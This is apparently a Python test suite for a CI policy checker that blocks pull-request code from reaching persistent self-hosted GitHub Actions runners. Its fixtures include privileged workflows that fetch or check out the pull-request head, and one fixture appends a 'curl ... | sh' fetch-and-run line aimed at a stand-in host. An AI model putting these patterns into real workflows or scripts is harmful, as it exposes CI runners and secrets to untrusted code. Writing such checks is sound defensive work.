#!/usr/bin/env python3
"""Behavioral tests for scripts/ci-gate/public-pr-runner-isolation.py.

The policy: code from a pull request in a public repository never runs on a
persistent self-hosted runner. Every case writes a throwaway workflow tree and
runs the real checker against it, asserting both the exit status and the
message, because one "violation" exit cannot tell which rule tripped.
"""

from __future__ import annotations

import hashlib
import json
import os
import re
import subprocess
import sys
import tempfile
import textwrap

HERE = os.path.dirname(os.path.abspath(__file__))
SCRIPT = os.path.join(HERE, "public-pr-runner-isolation.py")

failures = 0


def ok(label: str) -> None:
    print(f"ok   - {label}")


def fail(label: str) -> None:
    global failures
    failures += 1
    print(f"FAIL - {label}")


def run_checker(workflows: dict[str, str], *arguments: str) -> tuple[int, str]:
    """Lay out a repository: bare names are workflows (or lists) in
    .github/workflows; names with a slash are repository paths."""
    with tempfile.TemporaryDirectory() as root:
        directory = os.path.join(root, ".github", "workflows")
        os.makedirs(directory)
        for name, body in workflows.items():
            target = os.path.join(root, name) if "/" in name else os.path.join(directory, name)
            os.makedirs(os.path.dirname(target), exist_ok=True)
            with open(target, "w", encoding="utf-8") as handle:
                handle.write(textwrap.dedent(body))
        arguments = tuple(argument.replace("{dir}", directory) for argument in arguments)
        completed = subprocess.run(
            [sys.executable, SCRIPT, *arguments, directory],
            capture_output=True,
            text=True,
        )
    return completed.returncode, completed.stdout + completed.stderr


def expect(
    workflows: dict[str, str],
    code: int,
    fragments: tuple[str, ...],
    label: str,
    *arguments: str,
) -> None:
    actual, output = run_checker(workflows, *arguments)
    missing = [fragment for fragment in fragments if fragment not in output]
    if actual != code or missing:
        fail(f"{label} (expected exit {code} with {missing or fragments}, got {actual}: {output.strip()})")
    else:
        ok(label)


expect(
    {
        "ci.yml": """
            on: pull_request
            jobs:
              test:
                runs-on: ${{ fromJSON(vars.CI_LANE_TRUSTED || vars.CI_LANE_FALLBACK || '["ubuntu-24.04"]') }}
                steps:
                  - run: 'true'
        """,
    },
    1,
    ("ci.yml", "test", "self-hosted"),
    "a pull_request job on the trusted lane is a violation",
)

expect(
    {
        "ci.yml": """
            on: [pull_request, push]
            jobs:
              publish:
                if: github.event_name == 'push'
                runs-on: ${{ fromJSON(vars.CI_LANE_TRUSTED || vars.CI_LANE_FALLBACK || '["ubuntu-24.04"]') }}
                steps:
                  - run: 'true'
        """,
    },
    0,
    ("clean",),
    "a job whose condition cannot hold on pull_request is not reachable",
)

expect(
    {
        "ci.yml": """
            on: pull_request
            jobs:
              admission:
                if: github.repository == 'Verjson/elsewhere'
                runs-on: ubuntu-24.04
                steps:
                  - run: 'true'
              build:
                needs: admission
                if: ${{ !github.event.pull_request.draft }}
                runs-on: ${{ fromJSON(vars.CI_LANE_TRUSTED || vars.CI_LANE_FALLBACK || '["ubuntu-24.04"]') }}
                steps:
                  - run: 'true'
        """,
    },
    0,
    ("clean",),
    "a job needing a skipped job without a status function is not reachable",
)

expect(
    {
        "caller.yml": """
            on: pull_request
            jobs:
              lint:
                uses: ./.github/workflows/lint.yml
        """,
        "lint.yml": """
            on: workflow_call
            jobs:
              lint:
                runs-on: ${{ fromJSON(vars.CI_RUNNER_FASTLANE || vars.CI_LANE_UNTRUSTED || '["ubuntu-24.04"]') }}
                steps:
                  - run: 'true'
        """,
    },
    1,
    ("caller.yml", "lint.yml", "lint"),
    "a local reusable workflow called on pull_request is checked through its caller",
)

expect(
    {
        "caller.yml": """
            on: pull_request
            jobs:
              build:
                uses: ./.github/workflows/build.yml
                with:
                  runner: ${{ vars.CI_RUNNER_DEFAULT }}
        """,
        "build.yml": """
            on:
              workflow_call:
                inputs:
                  runner:
                    type: string
                    default: ''
            jobs:
              build:
                runs-on: ${{ inputs.runner != '' && fromJSON(inputs.runner) || fromJSON(vars.CI_LANE_UNTRUSTED || '["ubuntu-24.04"]') }}
                steps:
                  - run: 'true'
        """,
    },
    1,
    ("build.yml", "inputs"),
    "a reusable workflow honoring a caller runner input on pull_request is a violation",
)

def digest(selector) -> str:
    """The pending-row key: SHA-256 of the job's runs-on value as canonical JSON."""
    canonical = json.dumps(selector, sort_keys=True, separators=(",", ":"), ensure_ascii=False)
    return "sha256:" + hashlib.sha256(canonical.encode("utf-8")).hexdigest()


TRUSTED_SELECTOR = """${{ fromJSON(vars.CI_LANE_TRUSTED || vars.CI_LANE_FALLBACK || '["ubuntu-24.04"]') }}"""
TRUSTED_LANE_PR_JOB = """
    on: pull_request
    jobs:
      test:
        runs-on: ${{ fromJSON(vars.CI_LANE_TRUSTED || vars.CI_LANE_FALLBACK || '["ubuntu-24.04"]') }}
        steps:
          - run: 'true'
"""

expect(
    {
        "ci.yml": TRUSTED_LANE_PR_JOB,
        "pending.tsv": (
            "# path<TAB>job<TAB>selector digest<TAB>reason\n"
            f"ci.yml\ttest\t{digest(TRUSTED_SELECTOR)}\tselector pinned elsewhere until a follow-up\n"
        ),
    },
    0,
    ("PENDING: ci.yml: job 'test'", "selector pinned elsewhere"),
    "a reviewed pending entry is reported as pending instead of failing",
    "--pending",
    "{dir}/pending.tsv",
)

expect(
    {
        "ci.yml": TRUSTED_LANE_PR_JOB.replace("vars.CI_LANE_FALLBACK || ", ""),
        "pending.tsv": f"ci.yml\ttest\t{digest(TRUSTED_SELECTOR)}\tlisted against the reviewed selector\n",
    },
    1,
    ("VIOLATION: ci.yml: job 'test'", "selector digest changed"),
    "a pending job whose selector changed is a violation, not masked by its row",
    "--pending",
    "{dir}/pending.tsv",
)

expect(
    {
        "ci.yml": """
            on: pull_request
            jobs:
              test:
                runs-on: ${{ fromJSON(vars.CI_LANE_UNTRUSTED || '["ubuntu-24.04"]') }}
                steps:
                  - run: 'true'
        """,
        "pending.tsv": f"ci.yml\ttest\t{digest(TRUSTED_SELECTOR)}\tfixed but still listed\n",
    },
    1,
    ("STALE PENDING: ci.yml: job 'test'",),
    "a pending entry that no longer violates fails until it is removed",
    "--pending",
    "{dir}/pending.tsv",
)

expect(
    {
        "ci.yml": """
            on: pull_request
            jobs:
              test:
                if: ${{ !contains(github.event.pull_request.labels.*.name, 'skip-ci') }}
                runs-on: ${{ fromJSON(vars.CI_LANE_TRUSTED || vars.CI_LANE_FALLBACK || '["ubuntu-24.04"]') }}
                steps:
                  - run: 'true'
        """,
    },
    1,
    ("ci.yml", "test", "self-hosted"),
    "an object filter in a condition is parsed rather than left undetermined",
)

# ---------------------------------------------------------------------------
# Hardening: failure modes and the routing shapes the live tree relies on. Each
# was proven to fail under a targeted mutation of the checker (see #1827).
# ---------------------------------------------------------------------------


def pull_request_job(runs_on: str, extra: str = "") -> dict[str, str]:
    return {
        "ci.yml": f"""
            on: pull_request
            jobs:
              test:{extra}
                runs-on: {runs_on}
                steps:
                  - run: 'true'
        """,
    }


expect(
    pull_request_job("""${{ fromJSON(vars.CI_LANE_UNTRUSTED || vars.CI_LANE_FALLBACK || '["ubuntu-24.04"]') }}"""),
    1,
    ("vars.CI_LANE_UNTRUSTED=<unset>", "vars.CI_LANE_FALLBACK="),
    "an untrusted lane that falls back to CI_LANE_FALLBACK can reach the persistent pool",
)
expect(
    pull_request_job("""${{ fromJSON(vars.CI_LANE_UNTRUSTED || '["ubuntu-24.04"]') }}"""),
    0,
    ("clean",),
    "the untrusted lane with a hosted tail is ephemeral whether or not it is set",
)
expect(
    pull_request_job("""${{ fromJSON(vars['CI_LANE_TRUSTED'] || '["ubuntu-24.04"]') }}"""),
    1,
    ("vars.CI_LANE_TRUSTED=",),
    "a bracket dereference of a persistent variable is enumerated like a dotted one",
)
expect(
    pull_request_job("[self-hosted, '${{ inputs.label }}']"),
    1,
    ("self-hosted",),
    "a literal self-hosted label in a runs-on list is a violation",
)
expect(
    pull_request_job("{group: DigitalOcean}"),
    1,
    ("group",),
    "a runner-group selector is never treated as ephemeral",
)
expect(
    pull_request_job("ubuntu-24.04"),
    0,
    ("clean",),
    "a literal GitHub-hosted image is ephemeral",
)
expect(
    pull_request_job("runner-${{ github.event_name }}"),
    2,
    ("UNDETERMINED", "interpolates"),
    "a selector built by string interpolation is undetermined, never clean",
)
expect(
    pull_request_job("${{ matrix.os }}"),
    2,
    ("UNDETERMINED", "cannot resolve"),
    "a selector the checker cannot resolve is undetermined, never clean",
)
expect(
    pull_request_job("""${{ fromJSON(vars.CI_LANE_TRUSTED ||| '["ubuntu-24.04"]') }}"""),
    2,
    ("UNDETERMINED",),
    "a malformed expression is undetermined, never clean",
)
expect(
    {
        "ci.yml": """
            on: pull_request
            jobs:
              remote:
                uses: Verjson/.github/.github/workflows/node-ci.yml@0123456789abcdef0123456789abcdef01234567
        """,
    },
    2,
    ("UNDETERMINED", "cannot read"),
    "a reachable remote reusable workflow is undetermined, never clean",
)
expect(
    {
        "ci.yml": """
            on: pull_request
            jobs:
              admission:
                if: github.repository == 'Verjson/elsewhere'
                runs-on: ubuntu-24.04
                steps:
                  - run: 'true'
              report:
                needs: admission
                if: always()
                runs-on: ${{ fromJSON(vars.CI_LANE_TRUSTED || '["ubuntu-24.04"]') }}
                steps:
                  - run: 'true'
        """,
    },
    1,
    ("report",),
    "always() keeps a job reachable behind a skipped dependency",
)
expect(
    {
        "ci.yml": """
            on: push
            jobs:
              test:
                runs-on: [self-hosted, general]
                steps:
                  - run: 'true'
        """,
    },
    0,
    ("clean",),
    "a workflow without a pull_request trigger is outside the policy",
)
expect({}, 2, ("UNDETERMINED", "no workflow files"), "an empty workflow directory is undetermined")
expect(
    {**pull_request_job("ubuntu-24.04"), "pending.tsv": f"ci.yml\ttest\t{digest('ubuntu-24.04')}\n"},
    2,
    ("UNDETERMINED", "path<TAB>job<TAB>selector digest<TAB>reason"),
    "a pending row without a reason is rejected",
    "--pending",
    "{dir}/pending.tsv",
)
expect(
    {**pull_request_job("ubuntu-24.04"), "pending.tsv": "ci.yml\ttest\tsha256:abc\treason\n"},
    2,
    ("UNDETERMINED", "selector digest"),
    "a pending row with a malformed selector digest is rejected",
    "--pending",
    "{dir}/pending.tsv",
)


# ---------------------------------------------------------------------------
# Review of #1827 (blocker): a reference compared against a literal must be
# tried AS that literal, or any gate keyed on a value outside the fixed
# candidate set reads as unreachable and the job is reported clean.
# ---------------------------------------------------------------------------
expect(
    {
        "ci.yml": """
            on: pull_request
            jobs:
              heavy:
                if: vars.ENABLE_HEAVY == 'true'
                runs-on: [self-hosted, general]
                steps:
                  - run: 'true'
        """,
    },
    1,
    ("heavy", "vars.ENABLE_HEAVY=true"),
    "a variable compared to a literal in a condition is tried as that literal",
)
expect(
    pull_request_job(
        """${{ vars.LANE_MODE == 'shared' && fromJSON('["self-hosted","general"]') || 'ubuntu-24.04' }}"""
    ),
    1,
    ("vars.LANE_MODE=shared",),
    "a variable compared to a literal in a selector is tried as that literal",
)
expect(
    {
        "caller.yml": """
            on: pull_request
            jobs:
              build:
                uses: ./.github/workflows/build.yml
                with:
                  lane: ${{ github.head_ref }}
        """,
        "build.yml": """
            on:
              workflow_call:
                inputs:
                  lane:
                    type: string
                    default: ''
            jobs:
              build:
                runs-on: ${{ inputs.lane == 'shared' && fromJSON('["self-hosted","general"]') || 'ubuntu-24.04' }}
                steps:
                  - run: 'true'
        """,
    },
    1,
    ("build.yml", "inputs.lane=shared"),
    "an attacker-shaped caller input compared to a literal is tried as that literal",
)
expect(
    pull_request_job(
        """${{ format('{0}', vars.LANE_MODE) == 'shared' && fromJSON('["self-hosted","general"]') || 'ubuntu-24.04' }}"""
    ),
    1,
    ("self-hosted",),
    "a comparison the checker cannot enumerate exactly is evaluated both ways",
)


# Only standard GitHub-hosted image names are ephemeral. A self-hosted runner
# can carry any custom label, so a look-alike must not pass as hosted.
for label in ("ubuntu-gpu-selfhosted", "ubuntu-24.04-large", "macos-14-xlarge",
              "windows-gpu", "ubuntu-２4.04", "Ubuntu-24.04x", '"ubuntu-24.04\\n"'):
    expect(
        pull_request_job(label),
        1,
        ("non-ephemeral",),
        f"look-alike label {label!r} is not treated as a standard hosted image",
    )
for label in ("ubuntu-latest", "ubuntu-22.04", "ubuntu-24.04-arm", "windows-latest",
              "windows-2025", "windows-11-arm", "macos-latest", "macos-15", "macos-15-intel"):
    expect(
        pull_request_job(label),
        0,
        ("clean",),
        f"standard hosted image {label!r} is ephemeral",
    )


# ---------------------------------------------------------------------------
# pull_request_target runs the BASE workflow with a privileged token, so it is
# dangerous exactly when a job materializes the pull request's head. Those jobs
# are held to the same placement rule; base-only jobs are not.
# ---------------------------------------------------------------------------


# Under privileged events head detection is a diagnostic: every persistent job
# fails unlisted, and these fixtures pin what the diagnostic reports.
REVIEW_REQUIRED = "requires a reviewed entry"
HEAD_DIAG = "head detection: materializes the pull request head"
NO_HEAD_DIAG = "head detection: no known head-materializing pattern"
UNDETERMINED_DIAG = "head detection: undetermined"


def target_job(steps: str, runs_on: str = TRUSTED_SELECTOR) -> dict[str, str]:
    return {
        "target.yml": f"""
            on: pull_request_target
            jobs:
              review:
                runs-on: {runs_on}
                steps:
{textwrap.indent(textwrap.dedent(steps), " " * 18)}
        """,
    }


expect(
    target_job("""
        - uses: actions/checkout@v4
          with:
            ref: ${{ github.event.pull_request.head.sha }}
        - run: make test
    """),
    1,
    ("target.yml [pull_request_target]", "review", HEAD_DIAG, REVIEW_REQUIRED),
    "a pull_request_target job that checks out the head is held to the placement rule",
)
expect(
    target_job("""
        - run: gh pr checkout ${{ github.event.pull_request.number }} && make test
    """),
    1,
    ("[pull_request_target]", "review", HEAD_DIAG),
    "a pull_request_target job running gh pr checkout is held to the placement rule",
)
expect(
    target_job("""
        - uses: actions/checkout@v4
          with:
            ref: ${{ env.CANDIDATE }}
    """),
    1,
    ("[pull_request_target]", "review", HEAD_DIAG),
    "a pull_request_target checkout through an indirection is treated as head-capable",
)
expect(
    target_job("""
        - env:
            HEAD_SHA: ${{ github.event.pull_request.head.sha }}
          run: git fetch --depth=1 origin "$HEAD_SHA" && git checkout FETCH_HEAD
    """),
    1,
    ("[pull_request_target]", "review", HEAD_DIAG),
    "a pull_request_target git fetch of a head-derived value is held to the placement rule",
)
expect(
    target_job("""
        - uses: actions/checkout@v4
          with:
            ref: ${{ github.event.pull_request.base.sha }}
        - env:
            HEAD_SHA: ${{ github.event.pull_request.head.sha }}
          run: gh api "repos/$GITHUB_REPOSITORY/commits/$HEAD_SHA/check-runs"
    """),
    1,
    (NO_HEAD_DIAG, REVIEW_REQUIRED),
    "a base-code pull_request_target job on a persistent runner still requires review",
)
expect(
    target_job(
        """
        - uses: actions/checkout@v4
          with:
            ref: ${{ github.event.pull_request.head.sha }}
        """,
        runs_on="ubuntu-24.04",
    ),
    0,
    ("clean",),
    "a pull_request_target head checkout on a hosted image is clean",
)

REVIEWED_REMOTE = "Verjson/.github/.github/workflows/app-key-environment.yml@ebe23fafbdb77dd2cca6f1862d932fde881b80d7"


def remote_target_call(workflow: str, job: str, uses: str) -> dict[str, str]:
    return {
        workflow: f"""
            on: pull_request_target
            jobs:
              {job}:
                uses: {uses}
        """,
    }


expect(
    remote_target_call("target.yml", "arm", REVIEWED_REMOTE),
    1,
    ("target.yml [pull_request_target]: job 'arm'", "remote callee", REVIEW_REQUIRED),
    "an unlisted remote callee under pull_request_target requires review",
)
expect(
    target_job("""
        - run: git fetch origin "+refs/pull/1/merge" && git checkout FETCH_HEAD
    """),
    1,
    ("[pull_request_target]", HEAD_DIAG),
    "a pull_request_target fetch of a refs/pull refspec is held to the placement rule",
)

expect(
    pull_request_job(
        """${{ vars.LANE_LEVEL > 2 && fromJSON('["self-hosted","general"]') || 'ubuntu-24.04' }}"""
    ),
    1,
    ("self-hosted",),
    "an ordering comparison over a variable is evaluated both ways",
)
expect(
    target_job("""
        - uses: actions/checkout@v4
          with:
            ref: refs/pull/1/merge
    """),
    1,
    ("[pull_request_target]", HEAD_DIAG),
    "a pull_request_target checkout of a literal refs/pull ref is head-capable",
)


# Re-review of #1827 at 7299a2f4: four head-materializing shapes passed clean.
expect(
    {
        "target.yml": f"""
            on: pull_request_target
            env:
              HEAD_SHA: ${{{{ github.event.pull_request.head.sha }}}}
            jobs:
              review:
                runs-on: {TRUSTED_SELECTOR}
                steps:
                  - run: git fetch origin "$HEAD_SHA" && git checkout "$HEAD_SHA"
        """,
    },
    1,
    ("[pull_request_target]", "review", HEAD_DIAG),
    "(a) a workflow-level env head value fetched by git is head-capable",
)
expect(
    target_job("""
        - run: gh pr diff ${{ github.event.number }} | git apply
    """),
    1,
    ("[pull_request_target]", "review", HEAD_DIAG),
    "(b) gh pr diff piped into git apply is head-capable",
)
expect(
    target_job("""
        - run: curl -sSL "https://api.github.com/repos/o/r/tarball/${{ github.event.pull_request.head.sha }}" | tar xz
    """),
    1,
    ("[pull_request_target]", "review", HEAD_DIAG),
    "(c) a download of a head tarball is head-capable",
)
expect(
    target_job("""
        - uses: some-org/fetch-source@v1
          with:
            revision: ${{ github.event.pull_request.head.sha }}
    """),
    1,
    ("[pull_request_target]", "review", HEAD_DIAG),
    "(d) a non-checkout action given a head value is head-capable",
)
expect(
    target_job("""
        - env:
            CANDIDATE: ${{ github.event.pull_request.head.sha }}
          run: ./tools/materialize "$CANDIDATE"
    """),
    1,
    (UNDETERMINED_DIAG, REVIEW_REQUIRED),
    "a head value handed to an unreadable program is reported undetermined and requires review",
)


INLINE_PROGRAM = """
        - env:
            PR_NUMBER: ${{{{ github.event.pull_request.number }}}}
          run: |
            program="$RUNNER_TEMP/inline-tool.py"
            cat >"$program" <<'PY'
            import subprocess
            {body}
            PY
            python3 -I "$program" "$PR_NUMBER"
"""
expect(
    target_job(INLINE_PROGRAM.format(body='subprocess.run(["gh", "api", "repos/o/r/pulls/1"], check=True)')),
    1,
    (NO_HEAD_DIAG, REVIEW_REQUIRED),
    "a program authored inline by the workflow is read for the diagnostic, not left ambiguous",
)
expect(
    target_job(INLINE_PROGRAM.format(body='subprocess.run(["git", "fetch", "origin", "pull/1/head"], check=True)')),
    1,
    ("[pull_request_target]", "review", HEAD_DIAG),
    "an inline-authored program that runs git fetch on a head value is head-capable",
)

expect(
    {
        "target.yml": f"""
            on: pull_request_target
            env:
              CANDIDATE: ${{{{ github.event.pull_request.head.sha }}}}
            jobs:
              review:
                runs-on: {TRUSTED_SELECTOR}
                steps:
                  - run: ./tools/materialize "$CANDIDATE"
        """,
    },
    1,
    (UNDETERMINED_DIAG, REVIEW_REQUIRED),
    "a workflow-level head value handed by name to an unreadable program is reported undetermined",
)
expect(
    target_job("""
        - run: gh pr diff 1 > change.patch && patch -p1 < change.patch
    """),
    1,
    ("[pull_request_target]", "review", HEAD_DIAG),
    "gh pr diff materializes the head even without a git command",
)


# ---------------------------------------------------------------------------
# Re-review of #1827 at 2f48d335: head detection cannot be made complete, so
# under pull_request_target, workflow_run and issue_comment any job that can
# land on a persistent runner fails unless a reviewed entry, keyed to a digest
# of its full content and inherited workflow settings, lists it. The reviewer's
# repros (g1-g7) must fail unlisted, whatever the diagnostics conclude.
# ---------------------------------------------------------------------------
REVIEWER_REPROS = {
    "g1 jq event payload into GITHUB_ENV then git fetch": """
        - run: echo "HEAD=$(jq -r .pull_request.head.sha "$GITHUB_EVENT_PATH")" >> "$GITHUB_ENV"
        - run: git fetch origin "$HEAD" && git checkout "$HEAD"
    """,
    "g2 jq into GITHUB_OUTPUT then git worktree add": """
        - id: head
          run: echo "sha=$(jq -r .pull_request.head.sha "$GITHUB_EVENT_PATH")" >> "$GITHUB_OUTPUT"
        - run: git -C repo worktree add ../pr "${{ steps.head.outputs.sha }}"
    """,
    "g3 github-script tarball download": """
        - uses: actions/github-script@v7
          with:
            script: |
              const pr = context.payload.pull_request;
              await github.rest.repos.downloadTarballArchive({owner: pr.head.repo.owner.login, repo: pr.head.repo.name, ref: pr.head.sha});
    """,
    "g4 git --git-dir fetch of refs/pull": """
        - env:
            PR: ${{ github.event.pull_request.number }}
          run: git --git-dir=.git fetch origin "refs/pull/$PR/head"
    """,
    "g5 PR number from the event file": """
        - run: n=$(jq .number "$GITHUB_EVENT_PATH"); git fetch origin "pull/$n/head"
    """,
    "g7 gh repo clone of the head repository": """
        - run: gh repo clone ${{ github.event.pull_request.head.repo.full_name }}
    """,
}
for label, steps in REVIEWER_REPROS.items():
    expect(
        target_job(steps),
        1,
        ("target.yml [pull_request_target]", "review", REVIEW_REQUIRED),
        f"{label}: an unlisted pull_request_target job on a persistent runner fails",
    )

for event in ("workflow_run", "issue_comment"):
    expect(
        {
            "privileged.yml": f"""
                on: {event}
                jobs:
                  review:
                    runs-on: {TRUSTED_SELECTOR}
                    steps:
                      - run: 'true'
            """,
        },
        1,
        (f"privileged.yml [{event}]", REVIEW_REQUIRED),
        f"an unlisted {event} job on a persistent runner fails",
    )


# ---------------------------------------------------------------------------
# The reviewed list: path<TAB>job<TAB>review digest<TAB>justification. The
# digest is read from the checker's own VIOLATION line, which is how an
# operator obtains it after reviewing the job.
# ---------------------------------------------------------------------------
REVIEW_DIGEST_LINE = r"VIOLATION: {path}: job '{job}': .*?review digest (sha256:[0-9a-f]{{64}})"


def review_row(workflows: dict[str, str], path: str, job: str, why: str = "reviewed for the fixture") -> str:
    code, output = run_checker(workflows)
    match = re.search(REVIEW_DIGEST_LINE.format(path=re.escape(path), job=re.escape(job)), output)
    if code != 1 or not match:
        raise AssertionError(f"no review digest for {path} {job}: {output}")
    return f"{path}\t{job}\t{match.group(1)}\t{why}\n"


def with_review(workflows: dict[str, str], rows: str) -> dict[str, str]:
    return {**workflows, "reviewed.tsv": rows}


REVIEWED_ARGS = ("--reviewed", "{dir}/reviewed.tsv")
LISTED = target_job("""
    - uses: actions/checkout@v4
      with:
        ref: ${{ github.event.pull_request.base.sha }}
        sparse-checkout: .github/workflows/target.yml
        sparse-checkout-cone-mode: false
    - run: make lint
""")
LISTED_ROW = review_row(LISTED, "target.yml [pull_request_target]", "review")

expect(
    with_review(LISTED, LISTED_ROW),
    0,
    ("REVIEWED: target.yml [pull_request_target]: job 'review' [reviewed for the fixture]", "clean"),
    "a reviewed privileged job with an unchanged digest passes",
    *REVIEWED_ARGS,
)
expect(
    with_review({"target.yml": LISTED["target.yml"].replace("make lint", "make lint!")}, LISTED_ROW),
    1,
    ("STALE REVIEWED: target.yml [pull_request_target]: job 'review': content changed",),
    "a one-character edit to a reviewed job turns its entry stale",
    *REVIEWED_ARGS,
)
INHERITED = {
    "target.yml": LISTED["target.yml"].replace(
        "on: pull_request_target\n", "on: pull_request_target\n            env:\n              MODE: safe\n", 1
    )
}
INHERITED_ROW = review_row(INHERITED, "target.yml [pull_request_target]", "review")
expect(
    with_review({"target.yml": INHERITED["target.yml"].replace("MODE: safe", "MODE: open")}, INHERITED_ROW),
    1,
    ("STALE REVIEWED", "content changed"),
    "an edit to inherited workflow env turns the entry stale",
    *REVIEWED_ARGS,
)
expect(
    with_review(
        {"target.yml": INHERITED["target.yml"].replace("MODE: safe", "MODE: safe\n            permissions:\n              contents: write")},
        INHERITED_ROW,
    ),
    1,
    ("STALE REVIEWED", "content changed"),
    "an edit to inherited workflow permissions turns the entry stale",
    *REVIEWED_ARGS,
)
TWINS = {
    "target.yml": f"""
        on: pull_request_target
        jobs:
          first:
            runs-on: {TRUSTED_SELECTOR}
            steps:
              - run: make lint
          second:
            runs-on: {TRUSTED_SELECTOR}
            steps:
              - run: make lint
    """,
}
expect(
    with_review(TWINS, review_row(TWINS, "target.yml [pull_request_target]", "first")),
    1,
    ("VIOLATION: target.yml [pull_request_target]: job 'second'", REVIEW_REQUIRED),
    "an entry never covers an identical job with a different id",
    *REVIEWED_ARGS,
)
expect(
    with_review(target_job("- run: make lint", runs_on="ubuntu-24.04"), ""),
    0,
    ("clean",),
    "a privileged job that resolves only to a hosted image passes unlisted",
    *REVIEWED_ARGS,
)
expect(
    with_review(target_job("- run: make lint", runs_on="ubuntu-24.04"), LISTED_ROW),
    1,
    ("STALE REVIEWED: target.yml [pull_request_target]: job 'review' no longer needs review",),
    "an entry for a job that no longer needs review is stale",
    *REVIEWED_ARGS,
)
CALLER = {
    "caller.yml": """
        on: pull_request_target
        jobs:
          call:
            uses: ./.github/workflows/callee.yml
            with:
              mode: lint
    """,
    "callee.yml": f"""
        on:
          workflow_call:
            inputs:
              mode:
                type: string
        jobs:
          work:
            runs-on: {TRUSTED_SELECTOR}
            steps:
              - run: make "${{{{ inputs.mode }}}}"
    """,
}
CALLEE_PATH = "caller.yml [pull_request_target]:call -> callee.yml"
expect(
    with_review({**CALLER, "caller.yml": CALLER["caller.yml"].replace("mode: lint", "mode: test")},
                review_row(CALLER, CALLEE_PATH, "work")),
    1,
    ("STALE REVIEWED", CALLEE_PATH),
    "an edit to the calling job's with: turns the callee entry stale",
    *REVIEWED_ARGS,
)
expect(
    with_review(LISTED, "target.yml [pull_request_target]\treview\tsha256:abc\twhy\n"),
    2,
    ("UNDETERMINED", "review digest must be sha256"),
    "a reviewed row with a malformed digest is rejected",
    *REVIEWED_ARGS,
)


expect(
    target_job("- run: make lint", runs_on="${{ matrix.os }}"),
    1,
    ("target.yml [pull_request_target]", REVIEW_REQUIRED),
    "a privileged job whose placement cannot be resolved requires review",
)
REMOTE_ROW = review_row(
    remote_target_call("gate-rearm.yml", "app-key-policy", REVIEWED_REMOTE),
    "gate-rearm.yml [pull_request_target]",
    "app-key-policy",
)
expect(
    with_review(remote_target_call("gate-rearm.yml", "app-key-policy", REVIEWED_REMOTE), REMOTE_ROW),
    0,
    ("REVIEWED: gate-rearm.yml [pull_request_target]: job 'app-key-policy'",),
    "a reviewed remote callee at its reviewed SHA passes",
    *REVIEWED_ARGS,
)
expect(
    with_review(
        remote_target_call("gate-rearm.yml", "app-key-policy", REVIEWED_REMOTE.replace("ebe23faf", "1be23faf")),
        REMOTE_ROW,
    ),
    1,
    ("STALE REVIEWED: gate-rearm.yml [pull_request_target]: job 'app-key-policy'",),
    "a reviewed remote callee repinned to another SHA turns stale",
    *REVIEWED_ARGS,
)
expect(
    with_review(
        {
            **remote_target_call("gate-rearm.yml", "app-key-policy", REVIEWED_REMOTE),
            **remote_target_call("other.yml", "app-key-policy", REVIEWED_REMOTE),
        },
        REMOTE_ROW,
    ),
    1,
    ("VIOLATION: other.yml [pull_request_target]: job 'app-key-policy'", REVIEW_REQUIRED),
    "an entry never covers identical content in another workflow",
    *REVIEWED_ARGS,
)


# ---------------------------------------------------------------------------
# Delta review of #1827 at 42508e98: an entry must go stale when code its job
# runs changes outside the workflow file, and when the trigger block changes.
# ---------------------------------------------------------------------------
SCRIPT_JOB = {
    "target.yml": f"""
        on:
          pull_request_target:
            types: [closed]
        jobs:
          review:
            runs-on: {TRUSTED_SELECTOR}
            steps:
              - uses: actions/checkout@v4
                with:
                  ref: ${{{{ github.event.pull_request.base.sha }}}}
                  path: .source
                  sparse-checkout: scripts/tool.sh
              - working-directory: .source
                run: bash scripts/tool.sh
    """,
    "scripts/tool.sh": "#!/usr/bin/env bash\ngh api repos/o/r\n",
}
SCRIPT_ROW = review_row(SCRIPT_JOB, "target.yml [pull_request_target]", "review")
expect(
    with_review(SCRIPT_JOB, SCRIPT_ROW),
    0,
    ("REVIEWED: target.yml [pull_request_target]: job 'review'",),
    "a reviewed job that runs a repository script passes while the script is unchanged",
    *REVIEWED_ARGS,
)
expect(
    with_review({**SCRIPT_JOB, "scripts/tool.sh": SCRIPT_JOB["scripts/tool.sh"] + "curl -sSL https://example.test/x | sh\n"}, SCRIPT_ROW),
    1,
    ("STALE REVIEWED: target.yml [pull_request_target]: job 'review': content changed",),
    "(a) editing a script the reviewed job executes turns its entry stale",
    *REVIEWED_ARGS,
)
expect(
    with_review(
        {"target.yml": SCRIPT_JOB["target.yml"].replace("types: [closed]", "types: [closed, opened]"),
         "scripts/tool.sh": SCRIPT_JOB["scripts/tool.sh"]},
        SCRIPT_ROW,
    ),
    1,
    ("STALE REVIEWED", "content changed"),
    "editing the workflow trigger block turns the entry stale",
    *REVIEWED_ARGS,
)
ACTION_JOB = {
    "target.yml": f"""
        on: pull_request_target
        jobs:
          review:
            runs-on: {TRUSTED_SELECTOR}
            steps:
              - uses: actions/checkout@v4
                with:
                  sparse-checkout: .github/actions/x
                  sparse-checkout-cone-mode: false
              - uses: ./.github/actions/x
    """,
    ".github/actions/x/action.yml": """
        name: x
        runs:
          using: composite
          steps:
            - shell: bash
              run: bash "${{ github.action_path }}/run.sh"
    """,
    ".github/actions/x/run.sh": "#!/usr/bin/env bash\necho lint\n",
}
ACTION_ROW = review_row(ACTION_JOB, "target.yml [pull_request_target]", "review")
expect(
    with_review(ACTION_JOB, ACTION_ROW),
    0,
    ("REVIEWED",),
    "a reviewed job that uses an unchanged local composite action passes",
    *REVIEWED_ARGS,
)
expect(
    with_review(
        {**ACTION_JOB, ".github/actions/x/action.yml": ACTION_JOB[".github/actions/x/action.yml"] + """
            - shell: bash
              run: git fetch origin "refs/pull/${{ github.event.number }}/head" && git checkout FETCH_HEAD && npm test
        """},
        ACTION_ROW,
    ),
    1,
    ("STALE REVIEWED", "content changed"),
    "(b) editing a local composite action the reviewed job uses turns its entry stale",
    *REVIEWED_ARGS,
)
expect(
    with_review({**ACTION_JOB, ".github/actions/x/run.sh": "#!/usr/bin/env bash\nnpm test\n"}, ACTION_ROW),
    1,
    ("STALE REVIEWED", "content changed"),
    "editing a script a local composite action runs turns the entry stale",
    *REVIEWED_ARGS,
)
FLOATING = remote_target_call("gate-rearm.yml", "app-key-policy", REVIEWED_REMOTE.split("@")[0] + "@main")
# The refusal carries no review digest to copy; any well-formed entry for the
# same path and job stands in for "an entry exists".
FLOATING_ROW = REMOTE_ROW
expect(
    with_review(FLOATING, FLOATING_ROW),
    1,
    ("VIOLATION: gate-rearm.yml [pull_request_target]: job 'app-key-policy'", "full 40-hex commit SHA"),
    "(c) a remote callee pinned to a branch is refused even with an entry",
    *REVIEWED_ARGS,
)
